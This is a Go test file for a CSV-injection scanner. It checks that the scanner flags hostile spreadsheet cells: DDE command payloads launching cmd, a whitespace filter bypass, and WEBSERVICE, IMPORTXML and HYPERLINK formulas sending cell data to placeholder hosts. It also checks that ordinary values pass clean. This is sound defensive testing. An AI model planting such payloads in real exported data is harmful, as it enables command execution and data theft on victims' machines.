// Tests for the pure detection engine. Every case is a plain string in, so
// the rules are exercised without any CSV parsing or filesystem access. Cases
// are chosen from real CSV-injection payloads seen in OWASP guidance and
// bug-bounty reports, plus the false-positive guards that keep the scanner
// usable on ordinary data.
package inject

import "testing"

// first returns the single expected finding, failing if the count is wrong.
func first(t *testing.T, fs []Finding) Finding {
	t.Helper()
	if len(fs) != 1 {
		t.Fatalf("want exactly 1 finding, got %d: %+v", len(fs), fs)
	}
	return fs[0]
}

func TestPlainFormulaIsMediumFormula(t *testing.T) {
	f := first(t, ScanCell("=1+2", ProfileAll, Options{}))
	if f.Kind != KindFormula || f.Severity != Medium {
		t.Fatalf("got kind=%s sev=%s", f.Kind, f.Severity)
	}
	if !f.AtStart {
		t.Fatal("formula finding should be at cell start")
	}
}

func TestDDEPipePayloadIsHighDDE(t *testing.T) {
	f := first(t, ScanCell(`=cmd|' /C calc'!A0`, ProfileAll, Options{}))
	if f.Kind != KindDDE || f.Severity != High {
		t.Fatalf("got kind=%s sev=%s", f.Kind, f.Severity)
	}
}

func TestDDEPipeInsideAtFunction(t *testing.T) {
	// A classic obfuscation: the DDE payload is reached via an @-function.
	f := first(t, ScanCell(`@SUM(1+9)*cmd|' /C calc'!A0`, ProfileExcel, Options{}))
	if f.Kind != KindDDE {
		t.Fatalf("expected DDE escalation, got %s", f.Kind)
	}
}

func TestDDEFunctionIsHighOnLibreOffice(t *testing.T) {
	f := first(t, ScanCell(`=DDE("cmd";"/C calc";"a")`, ProfileLibre, Options{}))
	if f.Kind != KindDDE || f.Severity != High {
		t.Fatalf("got kind=%s sev=%s", f.Kind, f.Severity)
	}
}

func TestWebserviceIsExfiltrationOnExcel(t *testing.T) {
	f := first(t, ScanCell(`=WEBSERVICE("http://127.0.0.1/x")`, ProfileExcel, Options{}))
	if f.Kind != KindExfil || f.Severity != High {
		t.Fatalf("got kind=%s sev=%s", f.Kind, f.Severity)
	}
}

func TestImportxmlIsExfiltrationOnSheets(t *testing.T) {
	f := first(t, ScanCell(`=IMPORTXML("http://example.test","//a")`, ProfileSheets, Options{}))
	if f.Kind != KindExfil {
		t.Fatalf("got %s", f.Kind)
	}
}

func TestImportxmlNotFlaggedAsExfilOnExcel(t *testing.T) {
	// Excel has no IMPORTXML, so under the excel profile this is only a
	// plain formula, not an exfiltration finding.
	f := first(t, ScanCell(`=IMPORTXML("http://example.test","//a")`, ProfileExcel, Options{}))
	if f.Kind != KindFormula {
		t.Fatalf("excel profile should see a plain formula, got %s", f.Kind)
	}
}

func TestHyperlinkIsExfiltration(t *testing.T) {
	f := first(t, ScanCell(`=HYPERLINK("http://example.test?"&A1,"click")`, ProfileAll, Options{}))
	if f.Kind != KindExfil {
		t.Fatalf("got %s", f.Kind)
	}
}

func TestPlusExpressionIsArithmetic(t *testing.T) {
	f := first(t, ScanCell("+1+1", ProfileAll, Options{}))
	if f.Kind != KindArithmetic || f.Severity != Low {
		t.Fatalf("got kind=%s sev=%s", f.Kind, f.Severity)
	}
}

func TestAtFunctionIsAtSign(t *testing.T) {
	f := first(t, ScanCell("@SUM(A1:A2)", ProfileExcel, Options{}))
	if f.Kind != KindAtSign {
		t.Fatalf("got %s", f.Kind)
	}
}

func TestTabAtStartIsControlOnExcel(t *testing.T) {
	f := first(t, ScanCell("\t=1+1", ProfileExcel, Options{}))
	if f.Kind != KindControl {
		t.Fatalf("got %s", f.Kind)
	}
}

func TestTabAtStartNotFlaggedOnSheets(t *testing.T) {
	// Google Sheets does not treat a leading TAB as a formula trigger.
	if fs := ScanCell("\thello", ProfileSheets, Options{}); len(fs) != 0 {
		t.Fatalf("expected no finding on sheets, got %+v", fs)
	}
}

func TestLeadingWhitespaceBypassStillFlagged(t *testing.T) {
	// A leading space is a well-known filter bypass: Excel trims it and
	// still evaluates the formula.
	f := first(t, ScanCell("   =1+1", ProfileAll, Options{}))
	if f.Kind != KindFormula {
		t.Fatalf("got %s", f.Kind)
	}
}

func TestLeadingWhitespaceBypassReachesDDE(t *testing.T) {
	f := first(t, ScanCell("  =cmd|' /C calc'!A0", ProfileAll, Options{}))
	if f.Kind != KindDDE {
		t.Fatalf("got %s", f.Kind)
	}
}

func TestPlainSignedNumberNotFlagged(t *testing.T) {
	for _, s := range []string{"-12.5", "+1234", "-1,234.56", "-1.2e-3", "-85%", "+0"} {
		if fs := ScanCell(s, ProfileAll, Options{}); len(fs) != 0 {
			t.Fatalf("signed number %q should be clean, got %+v", s, fs)
		}
	}
}

func TestPhoneNumberNotFlagged(t *testing.T) {
	for _, s := range []string{"+81 90-1234-5678", "+1 (555) 010-0100", "+44 20 7946 0000"} {
		if fs := ScanCell(s, ProfileAll, Options{}); len(fs) != 0 {
			t.Fatalf("phone %q should be clean, got %+v", s, fs)
		}
	}
}

func TestBareAtHandleNotFlaggedByDefault(t *testing.T) {
	if fs := ScanCell("@jaydencj", ProfileAll, Options{}); len(fs) != 0 {
		t.Fatalf("bare @handle should be clean, got %+v", fs)
	}
}

func TestParanoidFlagsSignedNumber(t *testing.T) {
	f := first(t, ScanCell("-12.5", ProfileAll, Options{Paranoid: true}))
	if f.Kind != KindArithmetic {
		t.Fatalf("got %s", f.Kind)
	}
}

func TestEmptyCellIsClean(t *testing.T) {
	if fs := ScanCell("", ProfileAll, Options{}); len(fs) != 0 {
		t.Fatalf("empty cell should be clean, got %+v", fs)
	}
}

func TestOrdinaryTextIsClean(t *testing.T) {
	for _, s := range []string{"Alice", "hello world", "2026-07-13", "a=b later", "price is =$5"} {
		if fs := ScanCell(s, ProfileAll, Options{}); len(fs) != 0 {
			t.Fatalf("text %q should be clean, got %+v", s, fs)
		}
	}
}

func TestEmbeddedNewlineFormulaFlagged(t *testing.T) {
	// The first line is safe, but a later line starts with '=': dangerous
	// if a downstream tool re-splits and re-exports the value.
	f := first(t, ScanCell("safe intro\n=1+1", ProfileAll, Options{}))
	if f.Kind != KindEmbedded || f.AtStart {
		t.Fatalf("got kind=%s atStart=%v", f.Kind, f.AtStart)
	}
}

func TestSeverityStringRoundTrip(t *testing.T) {
	for name, want := range map[string]Severity{"low": Low, "medium": Medium, "high": High} {
		got, err := ParseSeverity(name)
		if err != nil || got != want {
			t.Fatalf("ParseSeverity(%q)=%v,%v", name, got, err)
		}
		if got.String() != name {
			t.Fatalf("String mismatch: %q vs %q", got.String(), name)
		}
	}
}

func TestParseSeverityRejectsUnknown(t *testing.T) {
	if _, err := ParseSeverity("critical"); err == nil {
		t.Fatal("expected error for unknown severity")
	}
}

func TestPreviewEscapesControlChars(t *testing.T) {
	got := Preview("a\tb\r\nc", 40)
	if got != `a\tb\r\nc` {
		t.Fatalf("got %q", got)
	}
}
